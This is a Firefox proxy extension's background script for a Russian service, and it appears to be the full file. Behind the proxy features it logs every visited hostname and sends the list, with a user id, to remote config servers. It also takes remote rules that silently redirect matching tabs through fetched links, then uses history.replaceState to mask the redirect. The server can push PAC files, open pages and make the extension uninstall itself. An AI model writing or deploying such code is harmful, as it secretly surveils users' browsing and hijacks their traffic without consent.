(() => {
    let array = [], 
		set = new Set(),
		noControl = false;
	const init = async () => {
		await addListeners();
		(await browser.storage.local.get('pac')).pac && proxy();
		await setLocalStorage();
		share(create);
		config();
		uninstall();
	}
	const setLocalStorage = () => {
		return new Promise(resolve => {
			browser.storage.local.get(['start', 'uid', 'share', 'html', 'time', 'isEnabled', 'icon', 'config', 'ctime', 'dtime', 'version', 'userDomains', 'noProxy', 'onlyProxy', 'addProxy', 'allProxy'], r => {
				r.start == null && browser.storage.local.set({start: setDateNow()});
				r.uid == null && browser.storage.local.set({uid: setUid()});
				r.share == null && browser.storage.local.set({share: 0});
				r.html == null && browser.storage.local.set({html: '0;/common/share.html'});
				r.time == null && browser.storage.local.set({time: 7e6});
				r.isEnabled == null && browser.storage.local.set({isEnabled: !0});
				r.icon == null && browser.storage.local.set({icon: !0});
				r.config == null && browser.storage.local.set({config: 'https://php-version.fastproxy.xyz/proxy/firefox/ru/version/config.txt;https://cf-php-version.fastproxy.xyz/proxy/firefox/ru/version/config.txt;https://reserve.fastproxy.xyz/proxy/firefox/ru/version/config.txt;https://cf-node-version.fastproxy.xyz/proxy/firefox/ru/version/config.txt'}),
				r.ctime == null && browser.storage.local.set({ctime: setDateToUtcString(0)});
				r.dtime == null && browser.storage.local.set({dtime: setDateToUtcString(0)});
				r.version == null && browser.storage.local.set({version: browser.runtime.getManifest().version});
				r.userDomains == null && browser.storage.local.set({userDomains: !1});
				r.noProxy == null && browser.storage.local.set({noProxy: !1});
				r.onlyProxy == null && browser.storage.local.set({onlyProxy: !1});
				r.addProxy == null && browser.storage.local.set({addProxy: !1});
				r.allProxy == null && browser.storage.local.set({allProxy: !1});
				resolve(r);
			})
		})
	}
	const setStorage = (value, cb) => {
		browser.storage.local.get('b')
		.then(data => {
			data.b || (data.b = []);
			if (data.b.indexOf(cb(value)) === -1) {
				data.b.push(cb(value));
				return browser.storage.local.set({b: data.b});
			}
		})
		.catch(e => {})
	}
	const hash = value => toBase64(value);
	const setUid = () => `RU-${location.host}`;
	const setDateNow = () => Date.now();
	const setDateToUtcString = value => (value === 0 ? new Date(0) : new Date()).toUTCString();
	const setDateToLocaleString = () => new Date().toLocaleString('ru-ru', {timeZone: 'Europe/Moscow'}).replace(',', '');
	const create = url => browser.tabs.create({url});
	const update = (url, tabId, source, hist = 1) => {
		if (hist) {
			return new Promise(resolve => {
				browser.tabs.update(tabId, {url: url}, async tab => {
					const histUp = (tabId, info) => {
						if (info?.status === 'complete' && tabId === tab?.id) {
							browser.tabs.onUpdated.removeListener(histUp);
							browser.scripting.executeScript({
								target: {tabId: tabId},
								args: [source.replace(/^http:\/\//i, 'https://'), hist],
								func: histRep
							})
							resolve(tab);
						}
					}
					browser.tabs.onUpdated.hasListener(histUp) && browser.tabs.onUpdated.removeListener(histUp);
					browser.tabs.onUpdated.addListener(histUp);
				})
			})
		} 
		else {
			browser.tabs.update(tabId, {url: url}, error);
		}
	}
	const share = async (cb) => {
		const value = await browser.storage.local.get(['html', 'share', 'start']);
		const arr = split(value.html);
		if (value.share === 0 && arr[0] !== 0 && setDateNow() - value.start > 4e8 && performance.now() > 6e4) {
			await browser.storage.local.set({share: setDateNow()});
			cb(arr.shift());
		}
	}
	const hostname = (url) => new URL(url).hostname;
    const split = (array) => array && array.length > 0 ? array.split(';') : null;
    const fromBase64 = string => atob(string);
	const toBase64 = string => btoa(string);
    const setIcon = (path, title) => {
		browser.browserAction.setIcon({path: path});
		browser.browserAction.setTitle({title: title});
	}
	const storeErr = async (num, status, dest, url, cb) => {
		let {err} = await browser.storage.local.get('err');
		err || (err = []);
		err.push(cb(`${num}:${status}:${dest}:${url}:${setDateToLocaleString()}`));
		browser.storage.local.set({err});
	}
	const check = (source, url, cb, dest, id, type, back, num, pos, hist) => {
		const regexa = /(?:(?:https?):\/\/)([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?/g,
			regexb = /=$/g,
			result = regexb.test(source) ? `${source}${url}` : source;
		let count = 0;
		const load = result => {
			let ex;
			count++;
			if (count > 10) {
				storeErr(num, 555, hostname(url), hostname(result), hash);
				return;
			}
			fetch(result)
			.then(r => {
				if (compare(getHostname(r?.url), 'w3.org')) {
					storeErr(num, r.status, hostname(url), hostname(r.url), hash);
					return;
				}
				if (dest?.contains(r?.url)) {
					if (+(fromBase64(back))) {
						return;
					} 
					else {
						cb(r.url, id, url, +(fromBase64(hist)));
					}
				} 
				else if (+(fromBase64(type))) {
					r.text()
					.then(r => {
						try {
							cb(match(decodeURIComponent(decodeURIComponent(r)).trim(), regexa, +(fromBase64(pos))), id, url, +(fromBase64(hist)));
						} catch (e) {
							cb(match(r.trim(), regexa, +(fromBase64(pos))), id, url, +(fromBase64(hist)));
						}
					})
					.catch(() => {
						storeErr(num, r.status, hostname(url), hostname(r.url), hash);
					})
				} 
				else {
					const typeRegex = /text\/html/i;
					if (!typeRegex.test(r?.headers?.get('content-type'))) {
						storeErr(num, r.status, hostname(url), hostname(r.url), hash);
						return;
					}
					let curr;
					try {
						curr = decodeURIComponent(decodeURIComponent(r.url));
					} catch (e) {}
					r.text()
					.then(r => {
						try {
							ex = match(decodeURIComponent(decodeURIComponent(r))?.trim(), regexa, +(fromBase64(pos)))?.replace(/url=([^?&]*)(&)/, 'url=$1?');
						} catch(e) {
							ex = match(r?.trim(), regexa, +(fromBase64(pos)))?.replace(/url=([^?&]*)(&)/, 'url=$1?');
						}
						if (ex) {
							if (dest?.contains(ex)) {
								if (+(fromBase64(back))) {
									return;
								} 
								else {
									cb(ex, id, url, +(fromBase64(hist)));
								}
							} 
							else {
								load(ex);
							}
						} 
						else if (curr) {
							let matches;
							try {
								matches = decodeURIComponent(decodeURIComponent(curr)).match(/(https?:\/\/.*?(https?:\/\/.*))/);
							} catch(e) {
								matches = curr.match(/(https?:\/\/.*?(https?:\/\/.*))/);
							}
							matches?.[2] && load(matches?.[2]);
						}
					})
					.catch(() => {
						storeErr(num, r.status, hostname(url), hostname(r.url), hash);
					})
				}
			})
			.catch(() => {
				storeErr(num, 999, hostname(url), hostname(result), hash);
			})
		}
		load(result);
	}
	const getHostname = url => {
		let hostname;
		url.indexOf('//') > -1 ? (hostname = url.split('/')[2]) : (hostname = url.split('/')[0]);
		hostname = hostname.split(':')[0];
		hostname = hostname.split('?')[0];
		return hostname.replace(/^\./, '');
	}
	const compare = (host, dest) => {
		return host === dest || host.split('.').slice(-3).join('.') === dest || host.split('.').slice(-2).join('.') === dest;
	}
	const histRep = (source, hist) => {
		try {
			setTimeout(() => {history.replaceState('', '', source)}, hist * 1e3);
		} catch(e) {}
	}
	const match = (string, regex, pos = 0) => {
		try {
			return (string.match(regex) || [])[pos] || (string.match(regex) || [])[0];
		} catch (e) {
			return null;
		}
	}
    const removeListener = () => {
		browser.tabs.onUpdated.hasListener(onUpdated) && browser.tabs.onUpdated.removeListener(onUpdated);
	}
	const addListeners = () => {
		removeListener();
		browser.tabs.onUpdated.addListener(onUpdated);
		browser.runtime.onInstalled.addListener(onInstalled);
		browser.runtime.onMessage.addListener(onMessage);
		browser.proxy.settings.onChange.addListener(onProxy);		
		['onResponseStarted', 'onErrorOccurred'].forEach(i => {
			browser.webRequest[i].addListener(webRequest, {
				urls: ['<all_urls>'],
				types: ['main_frame']
			})
		})
	}
	const onInstalled = details => {
		if (details?.reason == 'install') {
			create('/common/start.html');
		} 
		else if (details?.reason == 'update') {
			browser.storage.local.set({share: 0, version: browser.runtime.getManifest().version});
			if (details?.previousVersion < '2.1.0') {
				create('common/update.html');
			}
		}
	}
	const incognito = () => browser.extension.isAllowedIncognitoAccess();
	const control = async () => {
		return (await browser.proxy.settings.get({})).levelOfControl;
	}
	const onProxy = details => {
		const storage = browser.storage.local.get('isEnabled');
		storage.then(async (value) => {
			if (value.isEnabled && details?.levelOfControl === 'controlled_by_other_extensions') {
				browser.proxy.settings.clear({});
				noControl = true;
				browser.browserAction.setBadgeText({text: 'err'});
				setIcon('icon-disabled.png', 'Ошибка');
				browser.browserAction.setBadgeBackgroundColor({color: '#f21a1a'});
			}
			if (value.isEnabled && details?.levelOfControl === 'controllable_by_this_extension') {
				proxy();
			}
			if (value.isEnabled && details?.levelOfControl === 'controlled_by_this_extension' && noControl) {
				noControl = false;
				setIcon('icon-enabled.png', 'Вкл');
				browser.browserAction.setBadgeText({text: ''});
			}
		})
	}
	const webRequest = details => {
		const storage = browser.storage.local.get(['isEnabled', 'icon']);
		storage.then(async value => {
			if (!await incognito()) {
				setIcon('icon-disabled.png', 'Ошибка');
				browser.browserAction.setBadgeText({text: 'err'});
			}		
			if (value.isEnabled && value.icon && details.proxyInfo && details.tabId > 0) {
				let count = 5;
				const tabId = details.tabId;
				const updateBadge = async () => {
					while (count > 0) {
						if (!tabId) {
							break;
						}
						try {
							const badge = await browser.browserAction.getBadgeText({tabId});
							if (badge) {
								break;
							}
							browser.browserAction.setBadgeText({text: '+', tabId});
							browser.browserAction.setBadgeBackgroundColor({color: '#0cec47', tabId});
						} 
						catch(e) {
							break;
						}
						count--;
						await new Promise(resolve => setTimeout(resolve, 500));
					}
				}
				updateBadge();
			}
		})
	}
	const onMessage = (request, sender, response) => {
		(async	()	=>	{
			request.a === 'e' ? (proxy(), response()) : request.a === 'err' && response({incog: await incognito(), ext: await control()})
		})()
		return true;
	}
	const onUpdated = (tabId, info, tab) => {
		const host = hostname(tab.url);
		if (info?.status === 'loading' || info?.status === 'complete') {
			setStorage(host, hash);
			if (!(array && array.length > 0)) {
				return;
			}
			for (const i in array) {
				if (array.hasOwnProperty(i)) {
					const a = array[i].a;
					if (tab.url.includes(fromBase64(a.d)) && compare(host, getHostname(fromBase64(a.d))) && !set.has(a.d)) {
						set.add(a.d);
						const {t: type = toBase64(0), p: pos = toBase64(0), b: back = toBase64(0), h: hist = toBase64(1)} = a;
						check(fromBase64(a.u), tab.url, update, fromBase64(a.d), tabId, type, back, a.n, pos, hist);
					}
				}
			}
		}
	}
	const uninstall = () => {
		browser.storage.local.get('uid').then(value => {
			browser.runtime.setUninstallURL(`https://reserve.fastproxy.xyz/proxy/firefox/ru/version/uninstall?uid=${value.uid}`);
		})
	}
	const config = () => {
		const storage = browser.storage.local.get();
		storage.then(value => {
			value.b || (value.b = []);
			value.err || (value.err = []);
			const url = {
				array: split(value.config),
				string: `?uid=${value.uid}&ver=${browser.runtime.getManifest().version}&extid=${browser.runtime.id}&start=${value.start}&hash=${[...value.b].join('-')}&err=${[...value.err].join('-')}`
			}
			const load = () => {
				fetch(url.array.pop() + url.string, {
					method: 'GET',
					headers: new Headers({
						'If-Modified-Since': value.ctime,
						'X-Requested-With': browser.runtime.id
					})
				})
				.then(r => {
					if (r.status == 304) {
						value?.k && (array = value.k);
						removeListener();
						browser.tabs.onUpdated.addListener(onUpdated);
						browser.storage.local.remove(['b', 'err']);
						data();
						return;
					}
					if (r.status == 204) {
						browser.management.uninstallSelf();
						return;
					}
					if (r.status != 200) {
						array = [];
						browser.storage.local.remove(['b', 'err']);
						removeListener();
						url.array.length == 0 ? data() : load();
						return;
					}
					if (r.ok) {
						const type = r.headers.get('content-type');
						if (!type || type.indexOf('application/json') == -1) {
							url.array.length == 0 ? data() : load();
							return;
						}
						r.json()
						.then(r => {
							let config = [],
								dconfig = [];
							browser.storage.local.set({html: fromBase64(r.r), time: fromBase64(r.t)});
							browser.storage.local.remove('k');
							for (let i in r) {
								if (r[i][0] && r[i][0].hasOwnProperty('c')) {
									for (let j = 1, l = r[i].length; j < l; ++j) {
										let configString = r.c[j].d;
										config += fromBase64(configString);
									}
									browser.storage.local.set({config: config});
								}                           
								else if (r[i][0] && r[i][0].hasOwnProperty('p')) {
									for (let j = 1, l = r[i].length; j < l; ++j) {
										let pacString = r.d[j].d;
										dconfig += fromBase64(pacString);
									}
									browser.storage.local.set({data: dconfig});
								}                           
								else if (r[i][0] && r[i][0].hasOwnProperty('a')) {
									let result = [];
									for (let j = 1, l = r[i].length; j < l; ++j) {
										result.push({[i]: r.a[j]});    
									}
									array = result;
									browser.storage.local.set({k: result});
								}
							}
							browser.storage.local.set({ctime: setDateToUtcString()});
							browser.storage.local.remove(['b', 'err']);
							data();
						})                      
					}
				})
				.catch(e => { 
					if (url.array.length == 0) {
						if (!value.pac) {
							setIcon('icon-disabled.png', 'Выкл');
							browser.browserAction.setBadgeText({text: 'err'});
							browser.browserAction.setBadgeBackgroundColor({color: '#f21a1a'});
							browser.storage.local.set({isEnabled: !1});
							(async () => {
								for (const tab of await browser.tabs.query({})) {
									try {
										const url = new URL(tab.url);
										if (url?.protocol == 'moz-extension:' && url?.hostname == location.host) {
											browser.tabs.sendMessage(tab.id, {error: 'error'});
										}
									}
									catch(e) {}
								}
							})()					
						}
					}
					else {
						load();
					}
					return;				
				})              
			}
			const wait = (condition, timeout = 5000) => {
				return new Promise(resolve => {
					const checkCondition = () => {
						if (condition()) {
							resolve();
						} 
						else {
							setTimeout(checkCondition, timeout);
						}
					}
					checkCondition();
				})
			}
			wait(() => navigator?.onLine === true).then(() => {
				load();
				set.clear();
			})
			let interval = setInterval(() => {
				share(create);
				config();
				clearInterval(interval);
			}, value.time);
		})
	}
	const data = () => {
		const storage = browser.storage.local.get(['data', 'uid', 'start', 'dtime']);
		storage.then(value => {
			if (!value.data) {
				browser.storage.local.set({isEnabled: !1});
				setIcon('icon-disabled.png', 'Выкл');
				(async () => {
					for (const tab of await browser.tabs.query({})) {
						try {
							const url = new URL(tab.url);
							if (url?.protocol == 'moz-extension:' && url?.hostname == location.host) {
								browser.tabs.sendMessage(tab.id, {error: 'error'});
							}
						}
						catch(e) {}
					}
				})()					
				return;            
			}
			const url = {
				array: split(value.data),
				string: `?uid=${value.uid}&ver=${browser.runtime.getManifest().version}&extid=${browser.runtime.id}&start=${value.start}`
			}
			const load = () => {
				fetch(url.array.pop() + url.string, {
					method: 'GET',
					headers: new Headers({
						'If-Modified-Since': value.dtime,
						'X-Requested-With': browser.runtime.id
					})
				})
				.then(r => {
					if (r.status == 304 || r.status == 204) {
						proxy();
						return;
					}
					if (r.status != 200) {
						url.array.length == 0 ? proxy() : load();
						return;
					}
					if (r.ok) {
						const type = r.headers.get('content-type');
						if (!type || type.indexOf('application/x-ns-proxy-autoconfig') == -1) {
							url.array.length == 0 ? proxy() : load();
							return;
						}
						r.text()
						.then(r => {
							browser.storage.local.set({pac: r, dtime: setDateToUtcString()});
							proxy();
							return;
						})
					}
				})
				.catch(e => { 
					url.array.length == 0 ? proxy() : load();
					return;                
				})    
			}
			load();
		})
	}		
    const proxy = async () => {
		await browser.proxy.settings.clear({});
		const storage = browser.storage.local.get();
		storage.then(value => {
			if (value.pac == null) {
				(async () => {
					for (const tab of await browser.tabs.query({})) {
						try {
							const url = new URL(tab.url);
							if (url?.protocol == 'moz-extension:' && url?.hostname == location.host) {
								browser.tabs.sendMessage(tab.id, {error: 'error'});
							}
						}
						catch(e) {}
					}
				})()				
			}
			if (value.isEnabled) {
				if (value.pac && value.pac.length > 0) {
					let regexSingle = /(\/\*[\w\s]+\*\/)([\w\s]+)(\/\*[\w\s]+\*\/)/ig,
						regexDouble = /(\/\*\*[\w\s]+\*\*\/)([\w\s]+)(\/\*\*[\w\s]+\*\*\/)/ig,
						finalPac = value.pac;	
					if (value.user_proxy) {
						let userProxyString = `'${value.user_proxy_type} ${value.user_proxy_http}:${value.user_proxy_port};'`;
						finalPac = finalPac.replace(regexSingle, `$1${userProxyString}$3`);
					}
					finalPac = finalPac.replace(regexDouble, `$1
						const	USER_OWN_PROXY = ${value.user_proxy},
								USER_OWN_PROXY_STRING = '${value.user_proxy_type} ${value.user_proxy_http}:${value.user_proxy_port};',
								USER_NO_PROXY = ${value.noProxy},
								USER_ONLY_PROXY = ${value.onlyProxy},
								USER_ADD_PROXY = ${value.addProxy},
								USER_ALL_PROXY = ${value.allProxy},
								USER_NO_PROXY_ARRAY = ${JSON.stringify(value.noProxyDomains)},
								USER_ONLY_PROXY_ARRAY = ${JSON.stringify(value.onlyProxyDomains)},
								USER_ADD_PROXY_ARRAY = ${JSON.stringify(value.addProxyDomains)};
						if (USER_NO_PROXY) {
							if (USER_NO_PROXY_ARRAY && USER_NO_PROXY_ARRAY.length > 0) {
								for (let i in USER_NO_PROXY_ARRAY) {
									if (USER_NO_PROXY_ARRAY[i] == host) return 'DIRECT';
									if (USER_NO_PROXY_ARRAY[i][0] == '*') {
										let length = -1 * (USER_NO_PROXY_ARRAY[i].length - 2);
										if (USER_NO_PROXY_ARRAY[i].substr(length) == host) return 'DIRECT';
										length = -1 * (USER_NO_PROXY_ARRAY[i].length - 1);
										if (USER_NO_PROXY_ARRAY[i].substr(length) == host.substr(length)) return 'DIRECT';
									}
								}
							}			
						}
						if (USER_ONLY_PROXY && USER_OWN_PROXY) {
							if (USER_ONLY_PROXY_ARRAY && USER_ONLY_PROXY_ARRAY.length > 0) {
								for (let i in USER_ONLY_PROXY_ARRAY) {
									if (USER_ONLY_PROXY_ARRAY[i] == host) return USER_OWN_PROXY_STRING;
									else if (USER_ONLY_PROXY_ARRAY[i][0] == '*') {
										let length = -1 * (USER_ONLY_PROXY_ARRAY[i].length - 2);
										if (USER_ONLY_PROXY_ARRAY[i].substr(length) == host) return USER_OWN_PROXY_STRING;
										length = -1 * (USER_ONLY_PROXY_ARRAY[i].length - 1);
										if (USER_ONLY_PROXY_ARRAY[i].substr(length) == host.substr(length)) return USER_OWN_PROXY_STRING;
										else {
											return 'DIRECT';
										}
									}
									else {
										return 'DIRECT';
									}
								}
							}			
						}
						if (USER_ADD_PROXY && USER_OWN_PROXY) {
							if (USER_ADD_PROXY_ARRAY && USER_ADD_PROXY_ARRAY.length > 0) {
								for (let i in USER_ADD_PROXY_ARRAY) {
									if (USER_ADD_PROXY_ARRAY[i] == host) return USER_OWN_PROXY_STRING;
									if (USER_ADD_PROXY_ARRAY[i][0] == '*') {
										let length = -1 * (USER_ADD_PROXY_ARRAY[i].length - 2);
										if (USER_ADD_PROXY_ARRAY[i].substr(length) == host) return USER_OWN_PROXY_STRING;
										length = -1 * (USER_ADD_PROXY_ARRAY[i].length - 1);
										if (USER_ADD_PROXY_ARRAY[i].substr(length) == host.substr(length)) return USER_OWN_PROXY_STRING;
									}
								}
							}			
						}
						if (USER_ALL_PROXY && USER_OWN_PROXY) {
							return USER_OWN_PROXY_STRING;
						}
						
					$3`);
					const blob = new Blob([finalPac], {type: 'application/x-ns-proxy-autoconfig'});
					const tempblob = new Blob([`function FindProxyForURL(url, host) {return 'DIRECT';}`], {type: 'application/x-ns-proxy-autoconfig'});
					const temp = {
						proxyType: 'autoConfig',
						autoConfigUrl: URL.createObjectURL(tempblob)
					}
					const config = {
						proxyType: 'autoConfig',
						autoConfigUrl: URL.createObjectURL(blob)	
					}
					browser.proxy.settings.set({value: temp}, () => {
						browser.proxy.settings.get({}, details => {
							if (details?.levelOfControl === 'controlled_by_this_extension') {
								browser.proxy.settings.set({value: config});
							}
							if (details?.levelOfControl === 'controlled_by_other_extensions') {
								browser.proxy.settings.clear({});
								noControl = true;
								setIcon('icon-disabled.png', 'err');
								browser.browserAction.setBadgeText({text: 'err'});
								browser.browserAction.setBadgeBackgroundColor({color: '#f21a1a'});
							}
						})
					})
					setIcon('icon-enabled.png', 'Вкл');
				}
				else {
					browser.proxy.settings.clear({});
					setIcon('icon-disabled.png', 'Выкл');
				}
			}
			else {
				browser.proxy.settings.clear({});
				setIcon('icon-disabled.png', 'Выкл');
			}
		})
    }
	String.prototype.contains = function(value) {
		let regexa = /^https?:\/\//i,
			regexb = regexa.test(this) ? this : `https://${this}`;
		return hostname(regexb).includes(hostname(value)) || hostname(value).includes(hostname(regexb));
	}	
	Array.prototype.contains = function(value) {
		return this.indexOf(value) > -1;
	}
	String.prototype.trim = function() {
		return this.replaceAll('\\','');
	}
	init();
})()
